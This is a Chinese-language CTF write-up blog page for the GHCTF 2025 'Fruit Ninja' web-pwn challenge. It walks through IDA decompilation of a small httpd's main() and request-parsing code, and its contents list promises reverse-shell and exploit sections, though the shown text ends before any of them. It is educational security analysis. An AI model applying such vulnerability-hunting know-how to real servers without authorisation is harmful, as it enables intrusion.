@@ -1,0 +1,731 @@
+  <!DOCTYPE html>
+  <html lang="zh-CN"  
+      data-theme-mode="auto"
+  >
+  <head>
+  <meta charset="utf-8">
+  
+  
+  
+  <script>window.REIMU_CONFIG = {};window.REIMU_CONFIG.icon_font = '4552607_ex15nbittbh';window.REIMU_CONFIG.clipboard_tips = {"success":{"zh-CN":"复制成功 (*^▽^*)"},"fail":{"zh-CN":"复制失败 (ﾟ⊿ﾟ)ﾂ"},"copyright":{"enable":false,"count":50,"license_type":"by-nc-sa"}};window.REIMU_CONFIG.clipboard_tips.copyright.content = '本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处！';window.REIMU_CONFIG.code_block = {"expand":true};window.REIMU_CONFIG.base = 'https://idcm-svg.github.io/HFTTC.github.io';window.REIMU_CONFIG.relative = '/HFTTC.github.io/';</script>
+  <title>
+    [GHCTF 2025]Fruit Ninja | HFTTC&#39;s Blog
+  </title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="preload" as="style" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic|Noto Serif SC:400,400italic,700,700italic&display=swap"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic|Noto Serif SC:400,400italic,700,700italic&display=swap" media="print" onload="this.media='all'">
+    <link rel="preload" href="//at.alicdn.com/t/c/font_4552607_ex15nbittbh.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+    
+<link rel="stylesheet" href="/HFTTC.github.io/css/loader.css">
+
+    <meta name="description" content="[GHCTF 2025]Fruit Ninja不太了解 WEBPWN 应该从哪里学起，那就从碰见的一道题目开始吧：[GHCTF 2025]Fruit Ninja | NSS 下载附件之后，我们发现和平时的 PWN 题目不太一样，同时注意到 httpd 是一个编译的二进制文件：  程序分析：我们进行 IDA 反编译一下，然后进行 checksec：发现栈保护全开：   这是一个非常经典的轻量级嵌入式">
+<meta property="og:type" content="article">
+<meta property="og:title" content="[GHCTF 2025]Fruit Ninja">
+<meta property="og:url" content="https://idcm-svg.github.io/HFTTC.github.io/2026/05/23/WEB-PWN/%5BGHCTF2025%5DFruitNinja/index.html">
+<meta property="og:site_name" content="HFTTC&#39;s Blog">
+<meta property="og:description" content="[GHCTF 2025]Fruit Ninja不太了解 WEBPWN 应该从哪里学起，那就从碰见的一道题目开始吧：[GHCTF 2025]Fruit Ninja | NSS 下载附件之后，我们发现和平时的 PWN 题目不太一样，同时注意到 httpd 是一个编译的二进制文件：  程序分析：我们进行 IDA 反编译一下，然后进行 checksec：发现栈保护全开：   这是一个非常经典的轻量级嵌入式">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/images/pwn/_a9fqGxtQ2l8_AcZ/1778381909080-5c4cc0d9-f5a0-4d2d-8b45-c1e0e99e3a34-446715.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/images/pwn/_a9fqGxtQ2l8_AcZ/1778384629698-c89c704c-f485-415a-bb23-c2005cfd1595-544388.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/images/pwn/_a9fqGxtQ2l8_AcZ/1778385063796-3a4c7635-67c6-4ffd-bd4f-9343ad7c1aee-712304.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/images/pwn/_a9fqGxtQ2l8_AcZ/1778389206110-e30192a6-bde3-4197-95b6-3e60f0f32f96-310881.png">
+<meta property="article:published_time" content="2026-05-22T18:46:49.000Z">
+<meta property="article:modified_time" content="2026-05-22T18:58:43.566Z">
+<meta property="article:author" content="HFTTC">
+<meta property="article:tag" content="pwn">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://idcm-svg.github.io/HFTTC.github.io/images/pwn/_a9fqGxtQ2l8_AcZ/1778381909080-5c4cc0d9-f5a0-4d2d-8b45-c1e0e99e3a34-446715.png">
+      <meta name="keywords" content="Pwn, CTF, Binary">
+    <link rel="alternate" href="/HFTTC.github.io/atom.xml" title="HFTTC's Blog" type="application/atom+xml">
+    <link rel="shortcut icon" href="/HFTTC.github.io/images/favicon.ico">
+  
+<link rel="stylesheet" href="/HFTTC.github.io/css/style.css">
+
+  <link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css" integrity="sha384-IfxC36XL/toUyJ939C73PcgMuRzAZuIzZxE38drsmO5p6jD7ei+Zx/1oA/0l8ysE" crossorigin="anonymous">
+    
+<script src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js" integrity="sha384-k6YtvFUEIuEFBdrLKJ3YAUbBki333tj1CSUisai5Cswsg9wcLNaPzsTHDswp4Az8" crossorigin="anonymous"></script>
+
+    
+<link rel="stylesheet" href="https://npm.webcache.cn/@reimujs/aos@0.1.2/dist/aos.css" integrity="sha384-GMRP93c6Hkz9JVKGAuRR3nTS7M07RwPgTFenXiosjq2VbVgvdDNcz1g6Mkj8AONa" crossorigin="anonymous">
+
+<meta name="generator" content="Hexo 8.1.1"></head>
+
+  <body>
+      <div id='loader'>
+    <div class="loading-left-bg loading-bg"></div>
+    <div class="loading-right-bg loading-bg"></div>
+    <div class="spinner-box">
+      <div class="loading-taichi rotate">
+          <svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="https://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
+            <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="var(--red-1, #ff5252)" />
+            <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z 
+           M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95z" fill="var(--red-1, #ff5252)" />
+          </svg>
+      </div>
+      <div class="loading-word">少女祈祷中...</div>
+    </div>
+  </div>
+  <script>
+    var time = null;
+    var loaderEl = document.getElementById('loader');
+    var startLoading = () => {
+      time = Date.now();
+      loaderEl.classList.remove("loading");
+    }
+    var hideLoader = () => {
+      document.body.style.overflow = 'auto';
+      loader.classList.add('loading');
+    };
+
+    var endLoading = () => {
+      if (!time) {
+        hideLoader();
+      } else {
+        if (Date.now() - time > 500) {
+          time = null;
+          hideLoader();
+        } else {
+          setTimeout(endLoading, 500 - (Date.now() - time));
+          time = null;
+        }
+      }
+    }
+    window.addEventListener('DOMContentLoaded', endLoading);
+    loaderEl.addEventListener('click', endLoading);
+  </script>
+<div id="copy-tooltip"></div>
+<div id="heatmap-tooltip"></div>
+
+
+    <div id="container">
+      <div id="wrap">
+        <div id="header-nav">
+  <nav id="main-nav" aria-label="Primary navigation">
+        <a class="main-nav-link-wrap" href="/HFTTC.github.io/">
+            <div class="main-nav-icon icon rotate">
+                &#xe62b;
+            </div>
+          <span class="main-nav-link">首页</span>
+        </a>
+        <a class="main-nav-link-wrap" href="/HFTTC.github.io/catalog">
+            <div class="main-nav-icon icon rotate">
+                &#xe62b;
+            </div>
+          <span class="main-nav-link">目录</span>
+        </a>
+        <a class="main-nav-link-wrap" href="/HFTTC.github.io/friend">
+            <div class="main-nav-icon icon rotate">
+                &#xe62b;
+            </div>
+          <span class="main-nav-link">友链</span>
+        </a>
+        <a class="main-nav-link-wrap" href="/HFTTC.github.io/archives">
+            <div class="main-nav-icon icon rotate">
+                &#xe62b;
+            </div>
+          <span class="main-nav-link">归档</span>
+        </a>
+        <a class="main-nav-link-wrap" href="/HFTTC.github.io/categories">
+            <div class="main-nav-icon icon rotate">
+                &#xe62b;
+            </div>
+          <span class="main-nav-link">分类</span>
+        </a>
+        <a class="main-nav-link-wrap" href="/HFTTC.github.io/tags">
+            <div class="main-nav-icon icon rotate">
+                &#xe62b;
+            </div>
+          <span class="main-nav-link">标签</span>
+        </a>
+        <a class="main-nav-link-wrap" href="/HFTTC.github.io/about">
+            <div class="main-nav-icon icon rotate">
+                &#xe62b;
+            </div>
+          <span class="main-nav-link">关于</span>
+        </a>
+    <a id="main-nav-toggle" class="nav-icon" aria-label="Toggle navigation" role="button"></a>
+  </nav>
+  <nav id="sub-nav" aria-label="Secondary navigation">
+      <a id="nav-rss-link" class="nav-icon" href="/HFTTC.github.io/atom.xml" title="RSS 订阅" aria-label="RSS 订阅" target="_blank"></a>
+      <a id="nav-search-btn" class="nav-icon popup-trigger" title="搜索" aria-label="搜索"></a>
+  </nav>
+</div>
+<header id="header" aria-label="Site header">
+        <picture>
+        </picture>
+          <img  fetchpriority="high" src="/HFTTC.github.io/images/banner.webp" alt="[GHCTF 2025]Fruit Ninja">
+  <div id="header-outer">
+    <div id="header-title">
+          <span id="logo">
+            <h1 data-aos="slide-up">[GHCTF 2025]Fruit Ninja</h1>
+          </span>
+        <h2 id="subtitle-wrap" data-aos="slide-down">
+        </h2>
+    </div>
+  </div>
+</header>
+
+        <div id="content" aria-label="Page content"  class="sidebar-right" >
+          <aside id="sidebar" aria-label="Sidebar">
+  <div class="sidebar-wrapper-container sticky">
+  <div class="sidebar-wrapper">
+    <div class="sidebar-wrap" data-aos="fade-up">
+          <div class="sidebar-toc-sidebar"><h3 class="toc-title">文章目录</h3>
+<div class="sidebar-toc-wrapper toc-div-class" >
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#GHCTF-2025-Fruit-Ninja"><span class="toc-number">1.</span> <span class="toc-text">[GHCTF 2025]Fruit Ninja</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%EF%BC%9A"><span class="toc-number">1.1.</span> <span class="toc-text">程序分析：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#main"><span class="toc-number">1.1.1.</span> <span class="toc-text">main</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#accept-request"><span class="toc-number">1.1.2.</span> <span class="toc-text">accept_request()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#execute-cgi"><span class="toc-number">1.1.3.</span> <span class="toc-text">execute_cgi</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EXP-%E6%80%9D%E8%B7%AF%EF%BC%9A"><span class="toc-number">1.2.</span> <span class="toc-text">EXP 思路：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9E%84%E9%80%A0-Payload-%E4%B8%8E-HTTP-%E5%8F%91%E5%8C%85"><span class="toc-number">1.2.1.</span> <span class="toc-text">构造 Payload 与 HTTP 发包</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%8D%E5%BC%B9-Shell-%E4%B8%8E%E6%8E%A5%E7%AE%A1%E6%8E%A7%E5%88%B6%E6%9D%83"><span class="toc-number">1.2.2.</span> <span class="toc-text">反弹 Shell 与接管控制权</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%BB-EXP%EF%BC%9A"><span class="toc-number">1.3.</span> <span class="toc-text">总 EXP：</span></a></li></ol></li></ol>
+</div>
+</div>
+          <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/HFTTC.github.io/avatar/head.jpg" data-sizes="auto" alt="HFTTC" class="lazyload">
+  <div class="sidebar-author-name">HFTTC</div>
+  <div class="sidebar-description">心之所向，无问西东</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">132</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">1</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">1</div>
+  </div>
+</div>
+<div class="sidebar-social" >
+    <div class="icon-github sidebar-social-icon">
+      <a href=https://github.com/IDCM-svg itemprop="url" target="_blank" aria-label="github" rel="noopener nofollow noreferrer"></a>
+    </div>
+</div>
+<div class="sidebar-menu">
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/" aria-label="首页"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/catalog" aria-label="目录"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">目录</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/friend" aria-label="友链"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/archives" aria-label="归档"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/categories" aria-label="分类"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">分类</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/tags" aria-label="标签"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">标签</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/about" aria-label="关于"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+</div>
+</div>
+          <div class="sidebar-btn-wrapper" style="position:static">
+            <div class="sidebar-toc-btn current"></div>
+            <div class="sidebar-common-btn"></div>
+          </div>
+    </div>
+  </div>
+  <div class="sidebar-widget">
+  </div>
+  </div>
+</aside>
+
+          <section id="main" aria-label="Main content"><article id="post-WEB-PWN/[GHCTF2025]FruitNinja" class="h-entry article" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-inner" data-aos="fade-up">
+    <div class="article-meta">
+      <div class="article-date">
+  <span class="article-date-link icon-calendar" data-aos="zoom-in">
+    <time datetime="2026-05-22T18:46:49.000Z" itemprop="datePublished">2026-05-23</time>
+    <time style="display: none;" id="post-update-time">2026-05-23</time>
+  </span>
+    <span class="article-date-link icon-calendar-plus" data-aos="zoom-in">
+      <time datetime="2026-05-22T18:58:43.566Z" itemprop="dateModified">2026-05-23</time>
+    </span>
+</div>
+
+    </div>
+    
+    <div class="hr-line"></div>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+        <h1 id="GHCTF-2025-Fruit-Ninja"><a href="#GHCTF-2025-Fruit-Ninja" class="headerlink" title="[GHCTF 2025]Fruit Ninja"></a>[GHCTF 2025]Fruit Ninja</h1><p>不太了解 WEBPWN 应该从哪里学起，那就从碰见的一道题目开始吧：<font style="color:rgb(0, 0, 0);">[GHCTF 2025]Fruit Ninja | NSS</font></p>
+<p><font style="color:rgb(0, 0, 0);">下载附件之后，我们发现和平时的 PWN 题目不太一样，同时注意到 httpd 是一个编译的二进制文件：</font></p>
+<p><img src="/HFTTC.github.io/images/pwn/_a9fqGxtQ2l8_AcZ/1778381909080-5c4cc0d9-f5a0-4d2d-8b45-c1e0e99e3a34-446715.png" alt="1778381909080-5c4cc0d9-f5a0-4d2d-8b45-c1e0e99e3a34.png"></p>
+<h3 id="程序分析："><a href="#程序分析：" class="headerlink" title="程序分析："></a>程序分析：</h3><p>我们进行 IDA 反编译一下，然后进行 checksec：发现栈保护全开：</p>
+<p><img src="/HFTTC.github.io/images/pwn/_a9fqGxtQ2l8_AcZ/1778384629698-c89c704c-f485-415a-bb23-c2005cfd1595-544388.png" alt="1778384629698-c89c704c-f485-415a-bb23-c2005cfd1595.png"></p>
+<p><img src="/HFTTC.github.io/images/pwn/_a9fqGxtQ2l8_AcZ/1778385063796-3a4c7635-67c6-4ffd-bd4f-9343ad7c1aee-712304.png" alt="1778385063796-3a4c7635-67c6-4ffd-bd4f-9343ad7c1aee.png"></p>
+<p><font style="color:rgb(0, 0, 0);">这是一个非常经典的</font>轻量级嵌入式 Web 服务器<font style="color:rgb(0, 0, 0);">的二进制逆向分析，是一个典型的</font>多线程并发处理模型<font style="color:rgb(0, 0, 0);">。  </font></p>
+<h4 id="main"><a href="#main" class="headerlink" title="main"></a>main</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall __noreturn <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">unsigned</span> __int16 v3; <span class="comment">// [rsp+Ah] [rbp-36h] BYREF</span></span><br><span class="line">    <span class="type">socklen_t</span> addr_len; <span class="comment">// [rsp+Ch] [rbp-34h] BYREF</span></span><br><span class="line">    <span class="type">int</span> fd; <span class="comment">// [rsp+10h] [rbp-30h]</span></span><br><span class="line">    <span class="type">int</span> v6; <span class="comment">// [rsp+14h] [rbp-2Ch]</span></span><br><span class="line">    <span class="type">pthread_t</span> newthread; <span class="comment">// [rsp+18h] [rbp-28h] BYREF</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr</span> <span class="title">addr</span>;</span> <span class="comment">// [rsp+20h] [rbp-20h] BYREF</span></span><br><span class="line">    <span class="type">unsigned</span> __int64 v9; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">    v9 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">    fd = <span class="number">-1</span>;</span><br><span class="line">    v3 = <span class="number">4000</span>;</span><br><span class="line">    v6 = <span class="number">-1</span>;</span><br><span class="line">    addr_len = <span class="number">16</span>;</span><br><span class="line">    fd = startup(&amp;v3, argv, envp);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;httpd running on port %d\n&quot;</span>, v3);</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        v6 = accept(fd, &amp;addr, &amp;addr_len);</span><br><span class="line">        <span class="keyword">if</span> ( v6 == <span class="number">-1</span> )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">if</span> ( pthread_create(&amp;newthread, <span class="number">0</span>, accept_request, (<span class="type">void</span> *)v6) )</span><br><span class="line">            perror(<span class="string">&quot;pthread_create&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    error_die(<span class="string">&quot;accept&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><code>startup()</code> 内部会执行标准的网络编程三步走：<code>socket()</code> -&gt; <code>bind()</code> -&gt; <code>listen()</code>。成功后返回一个用于监听的 Socket 文件描述符给 fd。随后打印出服务正在 4000 端口运行。</li>
+<li>v6 &#x3D; accept(…)：程序在此处阻塞，等待用户的 TCP 连接。一旦有网络请求进来，accept 会为该连接生成一个专用的客户端通信描述符 <code>v6</code>（比如值为 4、5 等）。</li>
+<li>pthread_create(…)：核心分发逻辑。程序并没有自己去处理 HTTP 报文，而是立刻创建了一个新线程。新线程去执行的目标函数是 accept_request。而传递给 accept_request 的参数正是刚才建立的客户端描述符 v6</li>
+<li>并发优势：主线程派发完任务后，立刻回到 <code>while(1)</code> 顶部继续 <code>accept</code> 下一个连接，互不干扰。</li>
+</ul>
+<h4 id="accept-request"><a href="#accept-request" class="headerlink" title="accept_request()"></a>accept_request()</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">accept_request</span><span class="params">(<span class="type">void</span> *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">    __int64 line; <span class="comment">// [rsp+20h] [rbp-8C0h]</span></span><br><span class="line">    <span class="type">unsigned</span> __int64 v4; <span class="comment">// [rsp+28h] [rbp-8B8h]</span></span><br><span class="line">    <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+28h] [rbp-8B8h]</span></span><br><span class="line">    <span class="type">unsigned</span> __int64 i; <span class="comment">// [rsp+30h] [rbp-8B0h]</span></span><br><span class="line">    <span class="type">char</span> *j; <span class="comment">// [rsp+38h] [rbp-8A8h]</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">stat_buf</span>;</span> <span class="comment">// [rsp+40h] [rbp-8A0h] BYREF</span></span><br><span class="line">    <span class="type">char</span> s1[<span class="number">256</span>]; <span class="comment">// [rsp+D0h] [rbp-810h] BYREF</span></span><br><span class="line">    <span class="type">char</span> v10[<span class="number">256</span>]; <span class="comment">// [rsp+1D0h] [rbp-710h] BYREF</span></span><br><span class="line">    <span class="type">char</span> s[<span class="number">512</span>]; <span class="comment">// [rsp+2D0h] [rbp-610h] BYREF</span></span><br><span class="line">    <span class="type">char</span> s2[<span class="number">1032</span>]; <span class="comment">// [rsp+4D0h] [rbp-410h] BYREF</span></span><br><span class="line">    <span class="type">unsigned</span> __int64 v13; <span class="comment">// [rsp+8D8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">    v13 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">    j = <span class="number">0</span>;</span><br><span class="line">    line = (<span class="type">int</span>)get_line((<span class="type">unsigned</span> <span class="type">int</span>)a1, s2, <span class="number">1024</span>);</span><br><span class="line">    v4 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; ((*__ctype_b_loc())[s2[i]] &amp; <span class="number">0x2000</span>) == <span class="number">0</span> &amp;&amp; v4 &lt;= <span class="number">0xFD</span>; ++i )</span><br><span class="line">        s1[v4++] = s2[i];</span><br><span class="line">    s1[v4] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ( !strcasecmp(s1, <span class="string">&quot;GET&quot;</span>) || !strcasecmp(s1, <span class="string">&quot;POST&quot;</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">        strcasecmp(s1, <span class="string">&quot;POST&quot;</span>);</span><br><span class="line">        v5 = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> ( ((*__ctype_b_loc())[s2[i]] &amp; <span class="number">0x2000</span>) != <span class="number">0</span> &amp;&amp; i &lt;= <span class="number">0x3FF</span> )</span><br><span class="line">            ++i;</span><br><span class="line">        <span class="keyword">while</span> ( ((*__ctype_b_loc())[s2[i]] &amp; <span class="number">0x2000</span>) == <span class="number">0</span> &amp;&amp; v5 &lt;= <span class="number">0xFD</span> &amp;&amp; i &lt;= <span class="number">0x3FF</span> )</span><br><span class="line">            v10[v5++] = s2[i++];</span><br><span class="line">        v10[v5] = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> ( !strcasecmp(s1, <span class="string">&quot;GET&quot;</span>) )</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">for</span> ( j = v10; *j != <span class="number">63</span> &amp;&amp; *j; ++j )</span><br><span class="line">                ;</span><br><span class="line">            <span class="keyword">if</span> ( *j == <span class="number">63</span> )</span><br><span class="line">                *j++ = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">sprintf</span>(s, <span class="string">&quot;www/html%s&quot;</span>, v10);</span><br><span class="line">        <span class="keyword">if</span> ( s[<span class="built_in">strlen</span>(s) - <span class="number">1</span>] == <span class="number">47</span> )</span><br><span class="line">            <span class="built_in">strcat</span>(s, <span class="string">&quot;index.html&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)_stat(s, &amp;stat_buf) == <span class="number">-1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">while</span> ( line &amp;&amp; <span class="built_in">strcmp</span>(<span class="string">&quot;\n&quot;</span>, s2) )</span><br><span class="line">                line = (<span class="type">int</span>)get_line((<span class="type">unsigned</span> <span class="type">int</span>)a1, s2, <span class="number">1024</span>);</span><br><span class="line">            not_found((<span class="type">int</span>)a1);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ( <span class="built_in">strstr</span>(s, <span class="string">&quot;..&quot;</span>) )</span><br><span class="line">        &#123;</span><br><span class="line">            serve_file((<span class="type">unsigned</span> <span class="type">int</span>)a1, <span class="string">&quot;www/html/hack.html&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> ( (stat_buf.st_mode &amp; <span class="number">0xF000</span>) == <span class="number">0x4000</span> )</span><br><span class="line">                <span class="built_in">strcat</span>(s, <span class="string">&quot;/index.html&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> ( (stat_buf.st_mode &amp; <span class="number">0x40</span>) != <span class="number">0</span> || (stat_buf.st_mode &amp; <span class="number">8</span>) != <span class="number">0</span> || (stat_buf.st_mode &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">                execute_cgi((<span class="type">unsigned</span> <span class="type">int</span>)a1, s, s1, j);</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                serve_file((<span class="type">unsigned</span> <span class="type">int</span>)a1, s);</span><br><span class="line">        &#125;</span><br><span class="line">        close((<span class="type">int</span>)a1);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        unimplemented((<span class="type">int</span>)a1);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> __readfsqword(<span class="number">0x28u</span>) ^ v13;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>解析 HTTP 请求行（Request Line），提取出请求方法（GET&#x2F;POST）和请求路径（URL），并根据文件属性决定是直接返回静态文件（serve_file）还是调用 CGI 脚本（execute_cgi）。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">line = (<span class="type">int</span>)get_line((<span class="type">unsigned</span> <span class="type">int</span>)a1, s2, <span class="number">1024</span>);</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>get_line：从网络连接中读取 HTTP 请求的第一行</li>
+</ul>
+<hr>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; ((*__ctype_b_loc())[s2[i]] &amp; <span class="number">0x2000</span>) == <span class="number">0</span> &amp;&amp; v4 &lt;= <span class="number">0xFD</span>; ++i )</span><br><span class="line">        s1[v4++] = s2[i];</span><br><span class="line">    s1[v4] = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> ( !strcasecmp(s1, <span class="string">&quot;GET&quot;</span>) || !strcasecmp(s1, <span class="string">&quot;POST&quot;</span>) )</span><br></pre></td></tr></table></figure>
+
